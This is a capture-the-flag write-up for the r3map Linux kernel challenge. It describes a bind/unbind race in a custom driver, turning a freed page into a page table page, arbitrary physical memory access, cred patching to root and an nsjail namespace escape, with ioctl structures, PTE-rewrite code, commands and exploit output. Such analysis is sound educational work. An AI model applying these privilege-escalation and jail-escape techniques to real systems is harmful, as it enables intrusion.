# r3map writeup

**Challenge:** r3map  
**Tagline:** *An East Kernel Challenge in the Age of AI*  
**Category:** Linux kernel / pwn  
**Flag:** `r3ctf{MInd_tH3-G4p_6tw_61ND_4ND-Un61nd134f8bfe}`

---

## TL;DR

The challenge boots a tiny Linux VM and drops us into a locked-down `ctf` shell inside `nsjail`.
The flag is mounted outside that jail at `/root/flagfs/flag`, so just becoming "root" inside the jail is not enough.

The vulnerable kernel module is `/dev/r3map_dev`. It has a race between **bind** and **unbind** operations. By winning the race, I kept a stale reference to a freed page. Then I forced the kernel to reuse that freed page as a **page table page**.

Once that happened, the stale module object let me edit my own page tables. Editing page tables is basically getting a remote control for physical memory: I could point one of my userland pages at arbitrary RAM and read/write kernel memory.

From there:

1. Leak/derive KASLR by scanning physical memory for `modprobe_path`.
2. Patch my `cred` structs so my process has UID 0 and full capabilities.
3. Patch my current `task_struct` so it uses the initial/root mount namespace and filesystem root.
4. Read `/root/flagfs/flag`.

---

## Challenge setup

The attachment had the usual kernel challenge pieces:

```text
bzImage
initramfs.cpio.gz
run.sh
server.py
flag.txt
```

`server.py` runs a proof-of-work and then starts QEMU through `run.sh`.

The important part of `run.sh` is that it provides the real flag to the guest through a readonly 9p mount:

```text
-virtfs local,path=runtime/flagfs,mount_tag=r3flag,security_model=none,readonly=on
```

Inside the guest, `/init` mounts that as root:

```sh
mount -t 9p -o trans=virtio,version=9p2000.L,ro r3flag /root/flagfs
chmod 0700 /root /root/flagfs
```

Then it starts the player shell through `nsjail` as user `ctf`.

So the real target is:

```text
/root/flagfs/flag
```

But from the jailed shell, we only see a fake `/flag` saying:

```text
The flag is outside guest memory. Get root and read /root/flagfs/flag.
```

That hint is very literal.

---

## What the driver does

The vulnerable device is:

```text
/dev/r3map_dev
```

The module exposes a few ioctls. I used these request shapes:

```c
#define IO_ALLOC 0xc0186b01UL
#define IO_FREE  0x40086b02UL
#define IO_MAP   0x40306b03UL
#define IO_RUN   0x40286b04UL

struct alloc_req {
    uint32_t type;
    uint32_t attr;
    uint64_t size;
    uint64_t id;
};

struct map_req {
    uint64_t vbo;
    uint64_t mem;
    uint64_t voff;
    uint64_t len;
    uint64_t moff;
    uint64_t cmd;
};

struct run_req {
    uint64_t id;
    uint64_t off;
    uint64_t len;
    uint64_t user;
    uint32_t op;
    uint32_t rsv;
};
```

There are two object types:

- `MEM`: backs storage with kernel pages.
- `VBO`: a virtual buffer object that can be bound to `MEM`.

In normal-person terms, think of `MEM` as a box of bytes and `VBO` as a window that can look into that box.

The interesting operation is bind/unbind:

```text
bind VBO -> MEM
unbind VBO
```

The bug is that those operations can race each other.

---

## The bug: stale mapping from a race

The exploit starts two operations at almost the same time:

1. Thread A: bind `VBO` to `MEM`.
2. Thread B: unbind the same `VBO`.

If the timing is right, the driver gets confused and leaves the VBO with a stale mapping to the MEM page.

The check I used was:

- write a page of `A`s into a `MEM` object,
- race bind/unbind,
- read from the `VBO`,
- if the `VBO` still reads the `A`s even though the module thinks it is unbound, the race was won.

The local/remote run usually won quickly:

```text
[+] race won i=1 v=2 m=1 unbind=0
```

At this point, the `VBO` still reaches the page, but the lifetime rules are broken. That is the whole exploit foundation.

---

## Annoying detail: the shrinker cache

Freeing the `MEM` object was not enough.

The module did not immediately give the physical page back to the normal kernel allocator. It kept freed MEM pages in a cache/list managed by a Linux **shrinker**.

A shrinker is a kernel mechanism for saying, roughly:

> If memory gets tight, please ask this subsystem to give back cached pages.

So after freeing the `MEM`, I had to create memory pressure to make the r3map shrinker actually release the page.

The exploit forks a child that allocates/touches a lot of RAM:

```text
[*] pressure child target=3500 MB to make r3map shrinker drop cached MEM pages
[*] pressure child status=0x9
```

The child dying is fine. Its job is just to scare the kernel into reclaiming cached pages.

---

## Turning a stale page into a page table page

Now the stale page is free and can be reused by the kernel.

The goal is to make the kernel reuse it as a **PTE page**.

A quick layman explanation:

- Your process sees virtual addresses like `0x7f...`.
- Real RAM uses physical addresses.
- The CPU needs a translation table between the two.
- A **page table entry**, or PTE, is one row in that translation table.

If we can edit a PTE page, we can say:

> Please make this userland address point at any physical RAM page I choose.

That gives arbitrary physical memory read/write.

To reclaim the stale page as a PTE page, I prepared many 2 MB VMAs and disabled transparent huge pages:

```c
prctl(PR_SET_THP_DISABLE, 1, 0, 0, 0);
```

Then I touched pages inside those VMAs. This forced Linux to allocate many normal 4 KB PTE pages.

The exploit kept reading the stale page through the old `VBO` until it looked like a page table page:

```text
[*] touching VMAs to force reclaim; this may consume most RAM
[+] stale page looks like PTE after base=912 page=1 q1=0x8000000049e47067 flags=0x8000000000000067
[+] controlled PTE window base=0x7f4470000000 idx=0 flags=0x8000000000000067
```

That means the stale driver object was now writing directly into a page table page owned by my process.

Game over, basically.

---

## Arbitrary physical memory read/write

With a controlled PTE page, I created a small userland window called `win`.

To read physical memory at address `phys`, the exploit rewrites PTEs like this:

```c
cur[i] = ((phys + i * 0x1000) & PFN_MASK) | pte_flags;
```

Then reading from `win` reads from that physical memory.
Writing to `win` writes to that physical memory.

The exploit maps memory in 2 MB batches, because one PTE page has 512 entries:

```text
512 * 0x1000 = 0x200000
```

One subtlety: the exploit flushes the TLB before installing the new strange PTEs. Otherwise the CPU may keep using old translations.

---

## Finding the kernel slide

Kernel ASLR means useful kernel addresses move around every boot.

To locate the kernel anyway, I scanned physical memory for the string:

```text
/sbin/modprobe\0
```

Specifically, I wanted the zero-padded instance that belongs to `modprobe_path`.

The static physical address from the extracted kernel was:

```text
modprobe_path static physical: 0x2d3fc50
```

On remote, the exploit found:

```text
[+] occurrence phys=0x4973fc50 zero_tail=1
```

So the physical slide was:

```text
0x4973fc50 - 0x2d3fc50 = 0x46a00000
```

Then I used `init_cred` and `init_user_ns` to calculate the virtual slide too:

```text
[*] phys_slide=0x46a00000
[*] vslide=0x2400000
```

Small funny note: the exploit still patches `modprobe_path` to `/tmp/x`, but that is not how the final exploit wins. On this kernel/setup, relying on a modprobe trigger was unreliable/not needed. The `modprobe_path` scan is mainly a convenient KASLR anchor.

---

## Becoming root: patching credentials

Linux stores process privileges in a `struct cred`.

The exploit scanned physical memory for cred-looking objects where all UID/GID fields were `1000`, because the jailed user is `ctf` with UID 1000.

When it found candidates, it patched them:

- uid/gid/euid/egid/fsuid/fsgid -> `0`
- capabilities -> all bits set
- user namespace related pointers -> copied from `init_cred`

Remote output:

```text
[*] scanning physical memory for uid 1000 cred structs
[+] cred-like phys=0x1804c00 usage=2
[+] cred-like phys=0x18bb000 usage=3
[+] cred-like phys=0x2391480 usage=1
[+] cred-like phys=0x2391f00 usage=2
[+] cred-like phys=0x370e840 usage=11
[+] cred-like phys=0x370ed80 usage=1
[*] patched 6 cred candidates; uid=0 euid=0
```

At this point, `getuid()` and `geteuid()` say root.

But this is a kernel challenge, so of course that is not the full story.

---

## Why root was not enough

The shell is inside `nsjail`, which uses namespaces.

Namespaces are like separate "views" of the system. Even if I become UID 0 inside that view, my process still has the jail's mount namespace. So `/root/flagfs/flag` may still be hidden or unreachable.

The init process has the good namespace: it mounted the real 9p flag before starting nsjail.

So I also patched my current `task_struct`.

The useful offsets were:

```text
task_struct->real_cred : 0x750
task_struct->cred      : 0x758
task_struct->comm      : 0x768
task_struct->fs        : 0x798
task_struct->nsproxy   : 0x7b0
```

I set my process name with:

```c
prctl(PR_SET_NAME, "exploit_self", 0, 0, 0);
```

Then I scanned physical memory for a task whose `comm` was `exploit_self`.

Once found, I replaced:

```text
task->fs      = init_fs
task->nsproxy = init_nsproxy
```

Remote output:

```text
[*] scanning for current task_struct; init_fs=0xffffffff85172660 init_nsproxy=0xffffffff8504dd10
[+] task-like phys=0x36a9640 real_cred=0xffff9330c18bb000 cred=0xffff9330c18bb000 old_fs=0xffff9330c12f2e00 old_ns=0xffff9330c36e9ee8
[*] patched 1 task_struct candidate(s) for namespace/fs escape
```

That step is what made the outside `/root/flagfs/flag` visible.

---

## Reading the flag

After the cred patch and namespace escape, the exploit simply opened:

```text
/root/flagfs/flag
```

Remote output:

```text
[+] OUTPUT from /root/flagfs/flag
r3ctf{MInd_tH3-G4p_6tw_61ND_4ND-Un61nd134f8bfe}
```

---

## Remote exploitation notes

The remote service first asks for proof-of-work:

```text
sha256(prefix + nonce) must start with 00000
```

After solving that, it boots the VM and gives a shell:

```text
r3ctf$ 
```

For upload, I compiled a smaller static binary with musl:

```sh
musl-gcc -static -Os -s -pthread \
  -idirafter /usr/include \
  -idirafter /usr/include/x86_64-linux-gnu \
  exploit_self.c -o exploit_self_musl
```

That reduced the exploit from about 811 KB to about 58 KB, which made pasting it into the VM much nicer.

Then I gzipped and base64-encoded it, uploaded it with a heredoc, decoded it in `/tmp`, and ran it:

```sh
cat > /tmp/e.b64 <<'EOF'
...base64 gzip data...
EOF
base64 -d < /tmp/e.b64 > /tmp/e.gz
gzip -dc /tmp/e.gz > /tmp/e
chmod +x /tmp/e
/tmp/e
```

The final remote run looked like this:

```text
[*] pid=8 uid=1000
[*] prepared 1800 untouched 2M VMAs
[*] attempt 0
[+] race won i=1 v=2 m=1 unbind=0
[*] freed mem=1, stale_vbo=2
[*] pressure child target=3500 MB to make r3map shrinker drop cached MEM pages
[*] pressure child status=0x9
[+] stale page looks like PTE after base=912 page=1 q1=0x8000000049e47067 flags=0x8000000000000067
[+] controlled PTE window base=0x7f4470000000 idx=0 flags=0x8000000000000067
[+] occurrence phys=0x4973fc50 zero_tail=1
[*] phys_slide=0x46a00000 vslide=0x2400000 init_cred_phys=0x4964e1d0 init_user_ns=0xffffffff8504c9f8
[*] patched 6 cred candidates; uid=0 euid=0
[*] patched 1 task_struct candidate(s) for namespace/fs escape
[+] OUTPUT from /root/flagfs/flag
r3ctf{MInd_tH3-G4p_6tw_61ND_4ND-Un61nd134f8bfe}
```

---

## Final exploit chain diagram

```text
bind/unbind race
      |
      v
stale VBO mapping to MEM page
      |
      v
free MEM object
      |
      v
force r3map shrinker to release cached page
      |
      v
reclaim stale page as user PTE page
      |
      v
edit own page tables
      |
      v
arbitrary physical memory read/write
      |
      v
find KASLR slide via modprobe_path
      |
      v
patch cred structs to root
      |
      v
patch task_struct fs/nsproxy to init values
      |
      v
read /root/flagfs/flag
```

---

## Takeaways

The main lesson is that kernel exploitation is often less about one magic write and more about carefully converting one primitive into a stronger primitive.

Here the primitive started as:

> I can accidentally keep using one freed page through the r3map driver.

Then it became:

> I can make that page become a page table page.

Then it became:

> I can rewrite page tables and access arbitrary physical memory.

And from there, patching creds and escaping namespaces was straightforward.

Also, for jail-based kernel challenges, remember:

> UID 0 is not always enough. You may also need the right namespaces.
